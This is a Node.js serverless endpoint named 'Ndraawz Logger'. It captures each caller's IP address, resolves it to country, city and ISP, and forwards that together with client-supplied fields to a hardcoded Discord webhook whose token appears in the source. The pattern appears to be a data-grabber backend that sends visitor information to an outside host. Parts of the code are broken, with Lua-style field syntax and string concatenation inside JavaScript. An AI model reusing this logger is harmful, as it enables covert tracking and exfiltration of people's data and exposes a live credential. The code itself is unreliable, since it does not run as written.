// api/log.js
const https = require('https');

const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1452653310443257970/SkdnTLTdZUq5hJUf7POXHYcILxlYIVTS7TVc-NYKruBSlotTJtA2BzHY9bEACJxrlnd5";

// Fungsi untuk ambil data IP dan geolokasi dari server
async function getIpInfo(ip) {
    return new Promise((resolve) => {
        // Gunakan ip-api.com dari sisi server
        const url = `http://ip-api.com/json/${ip}`;
        https.get(url, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const json = JSON.parse(data);
                    resolve({
                        ip: ip,
                        country: json.country || "N/A",
                        region: json.regionName || "N/A",
                        city: json.city || "N/A",
                        isp: json.isp || "N/A",
                        as: json.as || "N/A",
                        org: json.org || "N/A"
                    });
                } catch (e) {
                    resolve({ ip: ip, error: "Gagal ambil data" });
                }
            });
        }).on('error', () => resolve({ ip: ip, error: "Gagal ambil data" }));
    });
}

module.exports = async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method Not Allowed' });
    }
    
    // Ambil IP asli dari header (ini lebih akurat)
    const clientIp = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || "unknown";
    
    // Ambil data dari client (tanpa IP)
    let body = '';
    await new Promise((resolve) => {
        req.on('data', chunk => body += chunk);
        req.on('end', resolve);
    });
    
    try {
        const clientData = JSON.parse(body);
        
        // Ambil info IP dari server
        const ipInfo = await getIpInfo(clientIp);
        
        // Gabungkan fields dari client + fields IP dari server
        let allFields = clientData.fields || [];
        
        // Tambahkan field IP dan lokasi (hasil dari server)
        allFields.push(
            { name = "━━━━━━━━━━━━━━ 🌐 IP INFORMATION (SERVER) ━━━━━━━━━━━━━━", value = "ㅤ", inline = false },
            { name = "📡 IP Address", value = ipInfo.ip, inline = false },
            { name = "🚩 Country", value = ipInfo.country, inline = false },
            { name = "📍 Region", value = ipInfo.region, inline = false },
            { name = "🏙️ City", value = ipInfo.city, inline = false },
            { name = "🏢 ISP", value = ipInfo.isp, inline = false },
            { name = "📡 AS / Org", value = (ipInfo.as || "N/A") .. " / " .. (ipInfo.org || "N/A"), inline = false }
        );
        
        const embed = {
            title: "🚀 Ndraawz Logger",
            color: 0x00ff88,
            fields: allFields,
            timestamp: new Date().toISOString()
        };
        
        // Kirim ke Discord
        const payload = JSON.stringify({ embeds: [embed] });
        const url = new URL(DISCORD_WEBHOOK);
        const options = {
            hostname: url.hostname,
            path: url.pathname,
            method: 'POST',
            headers: { 'Content-Type': 'application/json' }
        };
        
        const discordReq = https.request(options, (discordRes) => {
            discordRes.resume();
            res.status(200).json({ ok: true });
        });
        discordReq.on('error', (err) => {
            console.error(err);
            res.status(500).json({ error: err.message });
        });
        discordReq.write(payload);
        discordReq.end();
        
    } catch (err) {
        res.status(400).json({ error: 'Invalid JSON' });
    }
};
